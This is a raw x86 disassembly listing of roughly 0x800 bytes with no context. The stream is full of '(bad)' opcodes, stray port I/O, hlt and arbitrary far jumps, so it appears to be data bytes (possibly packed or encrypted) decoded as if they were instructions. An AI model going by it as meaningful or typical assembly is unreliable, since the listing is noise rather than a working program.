  421484:	or     bl,BYTE PTR [edi-0x31f31783]
  42148a:	inc    edi
  42148b:	xchg   BYTE PTR [esi],bh
  42148d:	loope  0x421464
  42148f:	xor    al,0x9a
  421491:	sbb    eax,0xc4f045e4
  421496:	imul   esp,DWORD PTR [ebx+ebp*1-0xdca9cf0],0x6
  42149e:	sub    al,BYTE PTR [edi]
  4214a0:	in     al,0x20
  4214a2:	and    eax,0x7f1856e6
  4214a7:	ja     0x421454
  4214a9:	outs   dx,DWORD PTR ds:[esi]
  4214aa:	ret    
  4214ab:	push   ecx
  4214ac:	mov    esp,0x42bacb2c
  4214b1:	pop    ebp
  4214b2:	mov    WORD PTR [ebx-0x6e],cs
  4214b5:	jle    0x42147d
  4214b7:	inc    esi
  4214b8:	or     al,0x3c
  4214ba:	dec    ecx
  4214bb:	mov    dh,0x80
  4214bd:	scas   al,BYTE PTR es:[edi]
  4214be:	xchg   ebp,eax
  4214bf:	ins    DWORD PTR es:[edi],dx
  4214c0:	jle    0x421455
  4214c2:	inc    ebp
  4214c3:	stos   BYTE PTR es:[edi],al
  4214c4:	lahf   
  4214c5:	outs   dx,BYTE PTR ds:[esi]
  4214c6:	popf   
  4214c7:	pusha  
  4214c8:	mov    edi,0xf154ffd8
  4214cd:	and    BYTE PTR [esp+eiz*2+0x6ddacbaf],dh
  4214d4:	jmp    0x8774dd39
  4214d9:	out    0x22,al
  4214db:	mul    BYTE PTR [esp+edi*8]
  4214de:	mov    edi,0xe928b5b
  4214e3:	dec    eax
  4214e4:	push   esi
  4214e5:	and    edx,DWORD PTR [edx-0xf]
  4214e8:	adc    cl,BYTE PTR [edx+0x53]
  4214eb:	out    0xd3,eax
  4214ed:	aad    0xc6
  4214ef:	dec    esp
  4214f0:	pop    edi
  4214f1:	push   edi
  4214f2:	push   edx
  4214f3:	(bad)  
  4214f4:	(bad)  
  4214f5:	mov    esi,0x5e7730ef
  4214fa:	ins    DWORD PTR es:[edi],dx
  4214fb:	xor    eax,0xcb2cfa54
  421500:	mov    edx,0x85fdfa1d
  421505:	mov    edx,0x2d16f7aa
  42150a:	dec    ebp
  42150b:	hlt    
  42150c:	mov    bl,0x2e
  42150e:	fwait
  42150f:	or     dh,bh
  421511:	imul   cl
  421513:	pusha  
  421514:	xor    DWORD PTR [ebp+0x4c06e7da],ecx
  42151a:	ret    0xb43
  42151d:	push   cs
  42151e:	ja     0x421533
  421520:	in     eax,dx
  421521:	retf   0xc8ad
  421524:	xchg   esi,eax
  421525:	iret   
  421526:	adc    al,0x86
  421528:	inc    eax
  421529:	cmc    
  42152a:	popf   
  42152b:	fstp   QWORD PTR [esi-0x20138d1c]
  421531:	adc    eax,0xcc9b6b50
  421536:	stc    
  421537:	xor    bh,0x47
  42153a:	stos   DWORD PTR es:[edi],eax
  42153b:	imul   ecx,DWORD PTR [ebp+0x54f4634b],0x23
  421542:	sub    DWORD PTR [ebx+0x5e42fa88],ebx
  421548:	outs   dx,BYTE PTR ds:[esi]
  421549:	retf   0xe748
  42154c:	sub    al,0x3d
  42154e:	inc    edi
  42154f:	jns    0x421558
  421551:	loopne 0x4215bf
  421553:	js     0x421529
  421555:	or     dh,BYTE PTR ds:0x328c5003
  42155b:	cmp    eax,0xaabb0bc5
  421560:	lahf   
  421561:	pop    ecx
  421562:	shl    BYTE PTR [eax],1
  421564:	push   edi
  421565:	shl    BYTE PTR [ecx-0xb],1
  421568:	rcr    BYTE PTR [edi+esi*2-0x6c6fef41],cl
  42156f:	in     eax,0xd7
  421571:	mov    WORD PTR [esi+0x464798c3],fs
  421577:	fwait
  421578:	subps  xmm0,XMMWORD PTR [ecx-0x71]
  42157c:	sbb    ecx,DWORD PTR [ebx+0x1f5ac5ae]
  421582:	out    dx,al
  421583:	inc    edx
  421584:	xor    ebp,ebx
  421586:	mov    ebp,0x2d7e52c6
  42158b:	sub    DWORD PTR [edx+0x411ed643],edi
  421591:	push   0x9cd320e8
  421596:	fcomp  st(0)
  421598:	dec    eax
  421599:	mov    ebp,edx
  42159b:	je     0x421521
  42159d:	jmp    DWORD PTR [ecx-0x33]
  4215a0:	cmc    
  4215a1:	pop    ebp
  4215a2:	out    0xea,eax
  4215a4:	push   ebx
  4215a5:	scas   eax,DWORD PTR es:[edi]
  4215a6:	mov    cl,0x3
  4215a8:	push   cs
  4215a9:	xchg   DWORD PTR [edx+0x66],ebx
  4215ac:	mov    WORD PTR [ebx+esi*1-0x1878e6ad],fs
  4215b3:	mov    bh,0x32
  4215b5:	hlt    
  4215b6:	iret   
  4215b7:	enter  0x7665,0x70
  4215bb:	mov    eax,ds:0xd0b7b033
  4215c0:	imul   esp,DWORD PTR [ebx+edi*1+0x40],0xffffffbe
  4215c5:	push   eax
  4215c6:	mov    ?,WORD PTR [edi+0x73]
  4215c9:	jae    0x42158d
  4215cb:	arpl   WORD PTR [edi+0x3124acab],ax
  4215d1:	sub    DWORD PTR ds:0xa5bb6408,ecx
  4215d7:	push   edx
  4215d8:	dec    ebx
  4215d9:	mov    ch,0x4d
  4215db:	sub    bl,BYTE PTR [edi-0x158b6ec7]
  4215e1:	(bad)  
  4215e2:	in     al,dx
  4215e3:	push   0x3c
  4215e5:	sti    
  4215e6:	pop    esi
  4215e7:	sub    ecx,ebp
  4215e9:	push   ebx
  4215ea:	dec    esi
  4215eb:	fwait
  4215ec:	cmp    DWORD PTR [esi+0x52293fb7],esp
  4215f2:	les    esi,FWORD PTR [esi]
  4215f4:	push   ds
  4215f5:	pushf  
  4215f6:	sub    ebp,DWORD PTR [edi-0x62]
  4215f9:	es aaa 
  4215fb:	ret    
  4215fc:	sub    eax,esi
  4215fe:	sub    eax,esi
  421600:	inc    ebp
  421601:	mov    esi,DWORD PTR [esi+0x7a]
  421604:	(bad)  
  421605:	loopne 0x42164d
  421607:	(bad)  
  421608:	xor    DWORD PTR [edx-0x7456053c],eax
  42160e:	ret    0x4ae6
  421611:	ja     0x4215df
  421613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421614:	out    dx,al
  421615:	imul   ebp,DWORD PTR [edi],0xffffff9f
  421618:	out    dx,al
  421619:	push   0x693ce15f
  42161e:	cmp    eax,0x49b58904
  421623:	(bad)  [esi]
  421625:	sar    bl,1
  421627:	popf   
  421628:	(bad)  
  421629:	dec    ebp
  42162a:	jne    0x4215cc
  42162c:	rcl    BYTE PTR [edi],1
  42162e:	hlt    
  42162f:	xchg   esp,eax
  421630:	ins    DWORD PTR es:[edi],dx
  421631:	pop    esp
  421632:	jmp    0xe8f4:0x8d77d6d0
  421639:	mov    eax,ds:0x61b0bc8b
  42163e:	inc    eax
  42163f:	retf   0x84e7
  421642:	and    BYTE PTR [ebp+edi*1-0x77],0xd7
  421647:	into   
  421648:	fcom   QWORD PTR [ebx]
  42164a:	(bad)  
  42164b:	mov    ch,0x8c
  42164d:	mov    ebx,0xdaca5a6c
  421652:	inc    ah
  421654:	inc    eax
  421655:	mov    dl,0x9d
  421657:	add    DWORD PTR [eax+0x73],ebx
  42165a:	jmp    FWORD PTR [ebx+ecx*4]
  42165d:	mov    DWORD PTR [edx-0x5],0x5758d156
  421664:	ret    0x3cf5
  421667:	jg     0x421650
  421669:	rcl    BYTE PTR [edx],0xfc
  42166c:	cmp    dh,BYTE PTR [ebx+0x4d]
  42166f:	push   es
  421670:	push   es
  421671:	test   BYTE PTR [edx+0x72b4f8e8],cl
  421677:	std    
  421678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421679:	mov    eax,ds:0xebf48b28
  42167e:	pop    ss
  42167f:	and    edi,DWORD PTR [ebp+0x1c]
  421682:	add    eax,DWORD PTR [edi+0x6606fa50]
  421688:	xor    eax,ecx
  42168a:	add    al,0x2b
  42168c:	dec    esp
  42168d:	mov    ah,0x3e
  42168f:	out    0x7e,eax
  421691:	pop    ebx
  421692:	cmp    ebp,DWORD PTR [ecx+eax*4-0x5d]
  421696:	ins    BYTE PTR es:[edi],dx
  421697:	sub    dl,dl
  421699:	push   0xffffff8c
  42169b:	xor    eax,0x1eff9b9e
  4216a0:	fdivr  QWORD PTR [esi+0x16]
  4216a3:	(bad)  
  4216a4:	and    edx,esp
  4216a6:	dec    ebx
  4216a7:	pushf  
  4216a8:	mov    bl,BYTE PTR [edx+0x2c]
  4216ab:	fidiv  DWORD PTR [eax-0xcbe8e3d]
  4216b1:	in     eax,dx
  4216b2:	nop
  4216b3:	xchg   ebx,eax
  4216b4:	shl    BYTE PTR [esi+0x73b3a4e9],cl
  4216ba:	jne    0x421652
  4216bc:	pop    ds
  4216bd:	(bad)  
  4216be:	shr    ecx,1
  4216c0:	inc    ecx
  4216c1:	icebp  
  4216c2:	add    ebp,ecx
  4216c4:	stc    
  4216c5:	lahf   
  4216c6:	jne    0x42166b
  4216c8:	pusha  
  4216c9:	sbb    DWORD PTR [ebx+0x2a],eax
  4216cc:	inc    esp
  4216cd:	outs   dx,DWORD PTR ds:[esi]
  4216ce:	dec    eax
  4216cf:	cwde   
  4216d0:	mov    dl,0x17
  4216d2:	push   ss
  4216d3:	das    
  4216d4:	mov    WORD PTR [eax],gs
  4216d6:	lock sbb BYTE PTR [eax],cl
  4216d9:	fs push ebx
  4216db:	push   ds
  4216dc:	sbb    BYTE PTR [esi+edi*8-0x5b],ch
  4216e0:	jmp    0x421757
  4216e2:	jb     0x421744
  4216e4:	adc    BYTE PTR [ebx],dl
  4216e6:	loope  0x4216d6
  4216e8:	lock ds dec ebp
  4216eb:	out    0xd7,al
  4216ed:	stc    
  4216ee:	add    eax,0xb38fc944
  4216f3:	or     eax,0x921a5785
  4216f8:	mov    bl,0xa4
  4216fa:	cmp    DWORD PTR [edi],edx
  4216fc:	pop    ebx
  4216fd:	mov    edi,0xae67a174
  421702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421703:	(bad)  [ebp-0x7684bd3c]
  421709:	pop    eax
  42170a:	jecxz  0x421785
  42170c:	cs xchg bp,ax
  42170f:	mov    al,0xd4
  421711:	cwde   
  421712:	sub    eax,0x1753f757
  421717:	cld    
  421718:	out    0x17,eax
  42171a:	std    
  42171b:	add    DWORD PTR [esi+eiz*4-0x73],esi
  42171f:	jle    0x42175f
  421721:	repz pop esi
  421723:	sahf   
  421724:	push   0x36
  421726:	add    BYTE PTR [edx+0x77b42c4],dl
  42172c:	dec    ebx
  42172d:	shl    eax,1
  42172f:	and    eax,0x55a641bb
  421734:	test   al,dh
  421736:	cmp    al,0xde
  421738:	fisttp DWORD PTR [ebx-0x1a2556b1]
  42173e:	ds out dx,eax
  421740:	push   ds
  421741:	add    al,0xe4
  421743:	in     al,dx
  421744:	sub    bh,dh
  421746:	lds    edi,FWORD PTR [edi+0x6c]
  421749:	dec    ecx
  42174a:	rcl    BYTE PTR [ecx-0x3607f071],1
  421750:	mov    eax,0xe7af2fb2
  421755:	(bad)  
  421756:	in     al,dx
  421757:	push   ds
  421758:	pop    esi
  421759:	scas   al,BYTE PTR es:[edi]
  42175a:	pop    ss
  42175b:	ror    BYTE PTR [esi],cl
  42175d:	retf   
  42175e:	xchg   esi,eax
  42175f:	add    BYTE PTR [ebp-0x57],cl
  421762:	ds test al,0x9c
  421765:	and    al,0xb
  421767:	test   DWORD PTR [di],eax
  42176a:	xor    ecx,DWORD PTR [edx]
  42176c:	fst    QWORD PTR [edx+0x33]
  42176f:	inc    ebx
  421770:	mul    edi
  421772:	sahf   
  421773:	iret   
  421774:	push   ecx
  421775:	mov    bl,0x25
  421777:	loope  0x4217d9
  421779:	ficom  WORD PTR [ebp*4+0x6bec17db]
  421780:	call   0xda39:0x8ccb3fe8
  421787:	inc    esi
  421788:	arpl   WORD PTR [eax+0x6d],dx
  42178b:	lahf   
  42178c:	mov    al,0xe8
  42178e:	and    DWORD PTR [edi+0x2],0xc9852cb1
  421795:	call   FWORD PTR [ebx-0xc11fae2]
  42179b:	cmp    BYTE PTR [eax-0x47],dh
  42179e:	dec    ecx
  42179f:	mov    ah,BYTE PTR [edx+ebx*8]
  4217a2:	(bad)  
  4217a3:	jnp    0x421813
  4217a5:	jo     0x4217bd
  4217a7:	xlat   BYTE PTR ds:[ebx]
  4217a8:	pushf  
  4217a9:	or     ebx,DWORD PTR [edi+0x4a84c5f5]
  4217af:	std    
  4217b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217b1:	cmp    eax,0x70af8763
  4217b6:	add    cl,BYTE PTR [ebx-0x6888e49d]
  4217bc:	push   0xf
  4217be:	jl     0x4217e5
  4217c0:	pop    esp
  4217c1:	or     al,ch
  4217c3:	sub    edx,DWORD PTR [edx-0x74527f86]
  4217c9:	push   ds
  4217ca:	and    BYTE PTR [ebp-0x19],0xeb
  4217ce:	inc    ecx
  4217cf:	cmp    BYTE PTR [edx+0x57],ah
  4217d2:	hlt    
  4217d3:	mov    ecx,0xb251e7ba
  4217d8:	rcr    BYTE PTR [ebp+0x3f],1
  4217db:	xchg   BYTE PTR [esi-0x5f],bl
  4217de:	rol    BYTE PTR [esi+0xbdb7d59],0x74
  4217e5:	idiv   BYTE PTR [eax+0x45d0426d]
  4217eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ec:	sar    DWORD PTR [esi+eax*8+0x6529d79b],0x2b
  4217f4:	mov    dl,0xe6
  4217f6:	xchg   esp,eax
  4217f7:	aam    0x42
  4217f9:	fild   WORD PTR [eax]
  4217fb:	mov    edi,0x871974dd
  421800:	sbb    al,0x41
  421802:	int    0xe8
  421804:	inc    BYTE PTR [edx]
  421806:	jg     0x4217b1
  421808:	inc    esi
  421809:	jo     0x4217fe
  42180b:	bound  esi,QWORD PTR [ecx-0x53]
  42180e:	dec    ebp
  42180f:	inc    esi
  421810:	(bad)  
  421811:	outs   dx,DWORD PTR ds:[esi]
  421812:	mov    esp,0x5863526a
  421817:	mov    ?,ebx
  421819:	dec    esi
  42181a:	imul   esp,DWORD PTR [esi-0x4c],0xffffffcc
  42181e:	rcl    DWORD PTR [ecx+0x2a],1
  421821:	sar    BYTE PTR [ebx+ebx*2+0x6a],0xb5
  421826:	add    al,0x7b
  421828:	cmp    eax,0x8c7b1fd1
  42182d:	or     dh,cl
  42182f:	out    dx,al
  421830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421831:	mov    DWORD PTR [esi],esi
  421833:	outs   dx,BYTE PTR ds:[esi]
  421834:	int    0x8d
  421836:	xchg   DWORD PTR [edx],ebp
  421838:	mov    edx,0x14e554c5
  42183d:	retf   
  42183e:	popa   
  42183f:	in     eax,dx
  421840:	scas   al,BYTE PTR es:[edi]
  421841:	call   0x12131ecd
  421846:	adc    ecx,DWORD PTR [esi]
  421848:	push   ebp
  421849:	dec    eax
  42184a:	ja     0x4218c3
  42184c:	cmp    edi,ebp
  42184e:	sbb    BYTE PTR [edi+0x55],ch
  421851:	cld    
  421852:	push   esp
  421853:	mov    ecx,0xb347d63e
  421858:	add    bl,BYTE PTR [edx+0x28f2b209]
  42185e:	cmp    al,0xb9
  421860:	mov    eax,ds:0x6b3f9c87
  421865:	sti    
  421866:	loope  0x4218b9
  421868:	inc    DWORD PTR [eax]
  42186a:	jb     0x421858
  42186c:	(bad)  
  42186d:	int    0x9f
  42186f:	sub    eax,0x6ca99b82
  421874:	data16 adc al,0xa6
  421877:	clc    
  421878:	inc    ebp
  421879:	(bad)  
  42187a:	sbb    dh,BYTE PTR [ecx-0x63757f83]
  421880:	mov    DWORD PTR [edx+0xd],edx
  421883:	les    eax,FWORD PTR [edi+eax*2+0x7a27ebd6]
  42188a:	mov    ds:0x57aeffee,eax
  42188f:	jmp    DWORD PTR [eax]
  421891:	sub    al,BYTE PTR [edx]
  421893:	mov    eax,0xc1c9c9c0
  421898:	loope  0x421908
  42189a:	jnp    0x4218af
  42189c:	neg    BYTE PTR [ecx+0xa]
  42189f:	or     BYTE PTR [ecx+0x607e8ee2],cl
  4218a5:	int3   
  4218a6:	(bad)  
  4218a7:	test   al,0x46
  4218a9:	push   ds
  4218aa:	or     dl,BYTE PTR [edx+eiz*4+0x5767a0fc]
  4218b1:	xchg   al,bh
  4218b3:	xor    al,0xc8
  4218b5:	push   es
  4218b6:	mov    ebp,esp
  4218b8:	lds    eax,FWORD PTR [eax-0x4b]
  4218bb:	pushf  
  4218bc:	retf   
  4218bd:	push   ss
  4218be:	das    
  4218bf:	sub    BYTE PTR [esi],al
  4218c1:	xor    BYTE PTR [ebx+eiz*1],ch
  4218c4:	ins    BYTE PTR es:[edi],dx
  4218c5:	(bad)  
  4218c6:	mov    ch,0x47
  4218c8:	rcr    BYTE PTR [ecx+0x2107a82c],0x7c
  4218cf:	and    esi,DWORD PTR gs:[esi]
  4218d2:	popa   
  4218d3:	ins    DWORD PTR es:[edi],dx
  4218d4:	data16 lods al,BYTE PTR ds:[esi]
  4218d6:	pop    ebp
  4218d7:	cmp    DWORD PTR [ebx+edi*8],ebx
  4218da:	cmp    DWORD PTR [ebp+ebp*2+0x30],ecx
  4218de:	sbb    DWORD PTR [edi],esi
  4218e0:	mov    edx,0x8a89b2d8
  4218e5:	sbb    BYTE PTR [ecx+esi*8-0x49],ah
  4218e9:	push   ebp
  4218ea:	push   ds
  4218eb:	xchg   ebp,eax
  4218ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218ed:	leave  
  4218ee:	stos   DWORD PTR es:[edi],eax
  4218ef:	pop    ss
  4218f0:	fcomp  st(6)
  4218f2:	out    0x7c,eax
  4218f4:	fucom  st(6)
  4218f6:	outs   dx,BYTE PTR ds:[esi]
  4218f7:	ret    
  4218f8:	fnstcw WORD PTR [edx]
  4218fa:	leave  
  4218fb:	or     edi,ebx
  4218fd:	xchg   edx,eax
  4218fe:	xchg   DWORD PTR [ebp+edi*2-0x5f],ecx
  421902:	xor    al,BYTE PTR [ebx+0x49]
  421905:	xor    ebx,ebx
  421907:	repz pop ebp
  421909:	nop
  42190a:	pop    ecx
  42190b:	sub    al,0x84
  42190d:	push   esp
  42190e:	lock les eax,FWORD PTR [esi-0x45]
  421912:	fsubrp st(0),st
  421914:	inc    ebp
  421915:	not    BYTE PTR [edi-0x7]
  421918:	pushf  
  421919:	pop    ecx
  42191a:	sbb    BYTE PTR [edi+esi*2+0x7a],bh
  42191e:	xchg   DWORD PTR [edi+0x36b1c23d],edi
  421924:	lea    edi,[edx]
  421926:	shl    DWORD PTR [edi-0x61d9bf17],cl
  42192c:	rcl    BYTE PTR [ebx+0xb],1
  42192f:	dec    ebp
  421930:	sbb    ah,BYTE PTR [ebp-0x7f]
  421933:	push   edi
  421934:	mov    es,WORD PTR ds:0x5266bcd7
  42193a:	jne    0x421903
  42193c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42193d:	rol    BYTE PTR [edx],0x1d
  421940:	mov    bl,0x1f
  421942:	pop    es
  421943:	jmp    0x1590:0x97ec3cd6
  42194a:	inc    ebx
  42194b:	jg     0x4218e7
  42194d:	push   cs
  42194e:	cmp    BYTE PTR [edx-0x36],0xc9
  421952:	pushf  
  421953:	test   al,dl
  421955:	lods   al,BYTE PTR ds:[esi]
  421956:	sub    al,0x58
  421958:	(bad)  
  42195a:	jmp    0x421971
  42195c:	retf   0x18eb
  42195f:	ins    BYTE PTR es:[edi],dx
  421960:	xchg   esp,eax
  421961:	rol    DWORD PTR [esi-0x7d0785c4],0x0
  421968:	xchg   esi,eax
  421969:	repnz ss inc ebx
  42196c:	mov    ds:0xe9ebe32e,eax
  421971:	xlat   BYTE PTR ds:[ebx]
  421972:	adc    edx,DWORD PTR [eax-0x1b]
  421975:	and    ch,BYTE PTR [ebx+ecx*4+0x783164a1]
  42197c:	and    al,0xd4
  42197e:	fwait
  42197f:	mov    ?,WORD PTR [esi]
  421981:	ins    BYTE PTR es:[edi],dx
  421982:	ficomp DWORD PTR [edi]
  421984:	adc    BYTE PTR [ebp-0x5cc90075],bh
  42198a:	mov    esp,0x7e629a0d
  42198f:	dec    ebx
  421990:	adc    ch,ah
  421992:	gs retf 
  421994:	sub    eax,ecx
  421996:	mov    dl,0xb0
  421998:	xchg   ecx,eax
  421999:	xchg   bl,ah
  42199b:	pop    edx
  42199c:	inc    esi
  42199d:	cdq    
  42199e:	je     0x4219d1
  4219a0:	cmc    
  4219a1:	mov    dh,0x9c
  4219a3:	dec    edi
  4219a4:	call   0x169d:0xa829f5e1
  4219ab:	lock aad 0x81
  4219ae:	in     al,0x31
  4219b0:	jb     0x421932
  4219b2:	jp     0x421986
  4219b4:	(bad)  
  4219b6:	iret   
  4219b7:	hlt    
  4219b8:	ja     0x4219a2
  4219ba:	popa   
  4219bb:	iret   
  4219bc:	(bad)  
  4219bd:	not    DWORD PTR [edx+0x392ff941]
  4219c3:	scas   al,BYTE PTR es:[edi]
  4219c4:	jb     0x4219d6
  4219c6:	adc    dh,BYTE PTR [ebp+0x1aae8677]
  4219cc:	clc    
  4219cd:	aad    0xcd
  4219cf:	test   al,0xd7
  4219d1:	mov    eax,0xdcbdc7d0
  4219d6:	(bad)  [esi]
  4219d8:	sub    eax,0x73591c04
  4219dd:	xchg   esi,eax
  4219de:	lock arpl WORD PTR [edx-0x1a5115d7],ax
  4219e5:	jecxz  0x421a15
  4219e7:	push   esp
  4219e8:	jae    0x421a54
  4219ea:	sar    DWORD PTR [esp+ebp*8+0x7873f47e],0xa1
  4219f2:	shl    BYTE PTR [ebp-0x4018e77f],1
  4219f8:	xchg   esp,eax
  4219f9:	psubb  mm0,QWORD PTR [ebx-0x7970f072]
  421a00:	jl     0x4219d8
  421a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a03:	inc    esi
  421a04:	push   edx
  421a05:	aaa    
  421a06:	mov    BYTE PTR [eax],ah
  421a08:	mov    ch,0x7
  421a0a:	xchg   esi,eax
  421a0b:	rcl    DWORD PTR [ebx-0x2],0x40
  421a0f:	test   BYTE PTR [edi-0x3b8653b],ch
  421a15:	pop    esp
  421a16:	in     eax,0x7b
  421a18:	inc    edx
  421a19:	pop    ebx
  421a1a:	call   0xe217f390
  421a1f:	inc    ebp
  421a20:	fwait
  421a21:	mov    bl,0x82
  421a23:	mov    eax,0x80aef3fa
  421a28:	shr    DWORD PTR [eax+esi*2],cl
  421a2b:	stos   BYTE PTR es:[edi],al
  421a2c:	xlat   BYTE PTR ds:[ebx]
  421a2d:	test   al,0x2d
  421a2f:	addr16 push 0xa52950ae
  421a35:	(bad)
  421a38:	pushf  
  421a39:	inc    esp
  421a3a:	fcomp  st(1)
  421a3c:	out    0xad,eax
  421a3e:	nop
  421a3f:	sar    ebp,0x59
  421a42:	hlt    
  421a43:	test   al,0x78
  421a45:	sahf   
  421a46:	cs add edx,ebp
  421a49:	outs   dx,BYTE PTR ds:[esi]
  421a4a:	cmp    bh,dl
  421a4c:	or     al,0x4b
  421a4e:	js     0x421a74
  421a50:	(bad)  
  421a51:	push   edx
  421a52:	arpl   bp,bx
  421a54:	popa   
  421a55:	xor    al,0x5a
  421a57:	jmp    0x6f66:0xbf10fd99
  421a5e:	xchg   BYTE PTR [esi],dh
  421a60:	fsubr  DWORD PTR [esi]
  421a62:	or     bl,ah
  421a64:	fnstcw WORD PTR [ecx+ebx*8-0x72384d97]
  421a6b:	sbb    esi,ebx
  421a6d:	mov    dl,0x4
  421a6f:	ins    DWORD PTR es:[edi],dx
  421a70:	pop    ss
  421a71:	clc    
  421a72:	or     ebx,DWORD PTR [edx-0xa283c1e]
  421a78:	mov    dl,0xb7
  421a7a:	out    0xbb,al
  421a7c:	cmp    ch,dl
  421a7e:	sub    eax,esp
  421a80:	cmc    
  421a81:	jns    0x421ad1
  421a83:	xchg   ecx,eax
  421a84:	dec    esp
  421a85:	cmc    
  421a86:	sub    al,0x8
  421a88:	xchg   esi,eax
  421a89:	ret    0x1dfc
  421a8c:	repz sbb al,0x13
  421a8f:	loopne 0x421ac2
  421a91:	mov    eax,ds:0x11c7f7af
  421a96:	pop    esp
  421a97:	frstor [ecx]
  421a99:	mov    bl,0xb3
  421a9b:	std    
  421a9c:	cmp    esi,eax
  421a9e:	out    0xb5,al
  421aa0:	push   edi
  421aa1:	fmul   DWORD PTR [ebp+0x8f84120]
  421aa7:	lods   al,BYTE PTR ds:[esi]
  421aa8:	pop    edx
  421aa9:	jbe    0x421abd
  421aab:	cmp    BYTE PTR [edx],ah
  421aad:	xor    bl,al
  421aaf:	mov    ecx,0xf304989e
  421ab4:	or     DWORD PTR [edx-0x7e],eax
  421ab7:	push   esi
  421ab8:	and    DWORD PTR [eax],ebp
  421aba:	push   ebx
  421abb:	mov    edx,0x33e1451f
  421ac0:	fwait
  421ac1:	dec    esp
  421ac2:	sub    BYTE PTR [ebp-0x24484b6],bh
  421ac8:	call   0xea3d:0x19422b99
  421acf:	stos   DWORD PTR es:[edi],eax
  421ad0:	cmc    
  421ad1:	test   al,0x37
  421ad3:	clc    
  421ad4:	fwait
  421ad5:	pop    ebx
  421ad6:	aaa    
  421ad7:	fwait
  421ad8:	fs mov ecx,0x1ad00693
  421ade:	xchg   ebp,eax
  421adf:	cmc    
  421ae0:	test   DWORD PTR [ebx+ebx*1-0x35531e81],edi
  421ae7:	mul    BYTE PTR [edx+0x29e8932a]
  421aed:	loope  0x421a94
  421aef:	into   
  421af0:	(bad)  
  421af1:	jmp    0x818f:0xfe125cf8
  421af8:	cld    
  421af9:	xchg   esp,ebx
  421afb:	xor    eax,DWORD PTR [edi-0x1b]
  421afe:	imul   DWORD PTR [eax]
  421b00:	sahf   
  421b01:	xchg   DWORD PTR [ecx],esi
  421b03:	push   0x4a
  421b05:	jl     0x421b1d
  421b07:	fsub   QWORD PTR [eax+0x646ecf35]
  421b0d:	inc    ebx
  421b0e:	fbstp  TBYTE PTR [ebp-0x58051f6b]
  421b14:	push   ds
  421b15:	(bad)  
  421b16:	jbe    0x421aba
  421b18:	imul   ecx,DWORD PTR [eax],0x9cb711b7
  421b1e:	fimul  DWORD PTR [eax+ecx*1+0x453de31b]
  421b25:	(bad)  
  421b26:	stos   BYTE PTR es:[edi],al
  421b27:	nop
  421b28:	and    BYTE PTR [esi+0x57],ah
  421b2b:	fadd   st(0),st
  421b2d:	dec    ecx
  421b2e:	push   es
  421b2f:	and    al,0xfa
  421b31:	aaa    
  421b32:	push   edx
  421b33:	inc    eax
  421b34:	sbb    al,0x2f
  421b36:	mov    ah,0x5e
  421b38:	adc    eax,0x99de07f5
  421b3d:	push   esp
  421b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b3f:	cli    
  421b40:	mov    ebp,0x26681ce7
  421b45:	mov    eax,ds:0x9dbc91fa
  421b4a:	shr    BYTE PTR [edi*1+0xf2d2f95],0x7c
  421b52:	es sbb eax,0xd87995d6
  421b58:	adc    ch,BYTE PTR [ecx]
  421b5a:	outs   dx,BYTE PTR ds:[esi]
  421b5b:	in     al,dx
  421b5c:	jle    0x421b4d
  421b5e:	dec    esp
  421b5f:	mov    eax,0x44e624
  421b64:	and    eax,DWORD PTR [edi]
  421b66:	lea    eax,[esi+0x69c4b9a3]
  421b6c:	cmp    DWORD PTR [ecx],eax
  421b6e:	inc    ebp
  421b6f:	push   0x4d
  421b71:	bound  esp,QWORD PTR [esi+0xe286b88]
  421b77:	adc    BYTE PTR [ecx-0x225b42a6],ah
  421b7d:	sbb    BYTE PTR [edx+0x711be8b2],0x6c
  421b84:	cmp    eax,0xc36109f2
  421b89:	xor    eax,0xb46e9f7f
  421b8e:	ret    0xf739
  421b91:	shl    BYTE PTR [esp+ebx*4-0x11],1
  421b95:	lock cs push ecx
  421b98:	fwait
  421b99:	jnp    0x421c15
  421b9b:	(bad)
  421b9e:	mov    ecx,0xc62b8365
  421ba3:	int    0x5b
  421ba5:	gs jmp 0xed135fcd
  421bab:	in     al,dx
  421bac:	dec    ebx
  421bad:	xchg   ecx,eax
  421bae:	xor    ecx,DWORD PTR [edi+ebp*8]
  421bb1:	mov    BYTE PTR [esi],bh
  421bb3:	mov    edi,0x896c576e
  421bb8:	xchg   edx,eax
  421bb9:	push   ds
  421bba:	shr    edx,cl
  421bbc:	add    BYTE PTR [edx+0x722db8b3],ah
  421bc2:	pop    ds
  421bc3:	test   al,0xcc
  421bc5:	mov    eax,0x6a9fff8f
  421bca:	dec    eax
  421bcb:	je     0x421b9b
  421bcd:	xchg   BYTE PTR [ebx+edx*4],bl
  421bd0:	mov    ebx,0xabfdd2d6
  421bd5:	idiv   BYTE PTR [ebx-0x72]
  421bd8:	pop    ecx
  421bd9:	(bad)  [ecx+0x76]
  421bdc:	push   0xfc54cca5
  421be1:	xchg   ebp,eax
  421be2:	call   0x4c34bd21
  421be7:	pop    eax
  421be8:	stos   BYTE PTR es:[edi],al
  421be9:	dec    ebp
  421bea:	pop    edx
  421beb:	stc    
  421bec:	hlt    
  421bed:	ins    DWORD PTR es:[edi],dx
  421bee:	repz out 0x5f,eax
  421bf1:	dec    ebx
  421bf2:	loope  0x421b8c
  421bf4:	and    ebx,edi
  421bf6:	xor    cl,al
  421bf8:	dec    ebx
  421bf9:	cmp    eax,0xc0721fac
  421bfe:	js     0x421be6
  421c00:	fisttp DWORD PTR [ebp-0x7f]
  421c03:	fs or  al,0x37
  421c06:	(bad)  
  421c07:	(bad)  
  421c08:	scas   al,BYTE PTR es:[edi]
  421c09:	mov    ebx,0x230175aa
  421c0e:	xchg   esi,eax
  421c0f:	jmp    0x421c44
  421c11:	sub    al,0x50
  421c13:	mov    dl,BYTE PTR [ebx]
  421c15:	sub    al,0x47
  421c17:	(bad)  
  421c18:	cmp    DWORD PTR [edx-0x61d2c51c],ecx
  421c1e:	lods   al,BYTE PTR ds:[esi]
  421c1f:	inc    esp
  421c20:	mov    eax,ds:0xf608fb99
